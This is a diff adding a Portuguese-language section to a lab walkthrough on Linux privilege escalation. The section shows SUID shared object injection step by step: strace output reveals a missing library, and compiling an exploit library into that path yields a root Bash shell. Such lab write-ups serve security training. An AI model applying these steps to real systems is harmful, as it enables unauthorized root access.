@@ -586,3 +586,65 @@ sh-4.1#
 ### Questões:
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 12 - SUID / SGID Executables - Shared Object Injection 
+
+O executável ***/usr/local/bin/suid-so*** SUID é vulnerável à injeção de objeto compartilhado.
+
+Primeiro, execute o arquivo e observe que atualmente ele exibe uma barra de progresso antes de sair:
+
+```shell
+user@debian:~$ /usr/local/bin/suid-so
+Calculating something, please wait...
+[=====================================================================>] 99 %
+Done.
+```
+
+Agora, execute ***strace*** no arquivo e pesquise a saída para chamadas de abertura/acesso e para erros "no such file":
+
+```shell
+user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+```
+Observe que o executável tenta carregar o objeto compartilhado /home/user/.config/libcalc.so no diretório home do usuário, mas não foi localizado.
+
+Crie o diretório .config para o arquivo libcalc.so:
+
+```shell
+mkdir /home/user/.config
+```
+
+Um exemplo de código que explora objeto (biblioteca) compartilhado pode ser encontrado em ***/home/user/tools/suid/libcalc.c*** na VM. Ele simplesmente gera um shell Bash. Compile o código em um objeto compartilhado no local em que o executável suid-so estava procurando por ele:
+
+```shell
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+Evidente que em um pentest real, seria preciso mandar esse código para o host alvo.
+
+Após compilar, execute novamente o ***/usr/local/bin/suid-so***:
+
+```shell
+user@debian:~$ mkdir /home/user/.config
+user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+user@debian:~$ /usr/local/bin/suid-so
+Calculating something, please wait...
+bash-4.1# 
+```
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
